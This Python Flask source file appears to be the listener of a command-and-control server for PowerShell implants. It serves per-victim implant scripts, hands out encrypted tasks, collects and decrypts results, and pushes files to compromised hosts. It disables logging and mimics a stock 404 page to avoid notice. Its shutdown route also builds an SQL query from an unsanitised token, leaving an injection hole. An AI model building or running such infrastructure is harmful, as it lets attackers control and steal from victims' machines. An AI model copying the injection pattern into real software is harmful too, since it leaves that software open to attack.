from flask import Flask, request
import threading
import os
from werkzeug.serving import make_server
import logging
import sqlite3
from Core import encryption,database,color


app= Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
app.logger.disabled = True

@app.route("/")
def index():
	return("Running",200)

@app.errorhandler(404)
def Error(issue):

	return ("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>",404)



@app.route("/down/<name>/host.ps1",methods=['GET'])
def Download_Implant(name):

	try:
		file = open("data/implant/%s/host.ps1" % name,"rt")
		content = file.read()
		file.close()
		return (content,200)
	except:
		return ("",400)



@app.route("/record/<name>",methods=['POST'])
def RecodeAImplant(name):
	return_back = database.Save_Implant(name)
	if (return_back):

		result = request.form.get("result")
		decrypt_results(name,result)

		return ("",200)
	else:
		return ("",400)




@app.route("/task/<name>",methods=['GET'])
def GiveATask(name):

	try:
		task = open("data/implant/%s/tasks.enc" % name,"r").read()
		return (task,200)

	except:
		return ("",400)




@app.route("/result/<name>",methods=['POST'])
def TakeAResult(name):

	result = request.form.get("result")
	decrypt_results(name,result.replace(' ',''))
	os.remove("data/implant/%s/tasks.enc" % name)
	return ("",200)






@app.route("/task/<name>/file.ret",methods=['GET'])
def Download(name):
	if os.path.exists("data/implant/%s/file.ret" % name):
		file = open("data/implant/%s/file.ret" % name,"r").read()

		if file:
			try:
				download_file = open(file,"r").read()
				os.remove("data/implant/%s/file.ret" % name)
				return (download_file,200)
			except:
				return ("",200)
		else:
			return ("",200)
	else:
		return ("",200)


@app.route("/shutdown/<name>/<token>", methods=['GET'])
def shutdown(name,token):

	try:
		connector = sqlite3.connect("database.db")
		connector.cursor()
		results = connector.execute("SELECT Listener_Name FROM Listener WHERE Listener_Token='%s'" % token)
		results = results.fetchall()
		if results:
			if results[0][0] == name:
				stop()
				return ("",200)
		else:
			return ("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>",404)
	except:

		return("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>",404)


def stop():

	shutdown_func = request.environ.get('werkzeug.server.shutdown')
	if shutdown_func is None:
		raise RuntimeError('Not running werkzeug')
	shutdown_func()


def start(ip,port):

	threading.Thread(target=app.run, daemon=True, args=[ip,port]).start()



def decrypt_results(name,results):

	try:
		conn = sqlite3.connect("database.db")
		key = database.return_key(conn,name)
		key = key[0][0]
		print ("\n[%s] %s Results is returned\n" % (color.green("+"),name))
		dec_results = encryption.DecryptString(results,key)
		file = open("data/implant/%s/result.dec" % name,"w")
		file.write(dec_results)
		file.close()
		return True

	except:
		return False

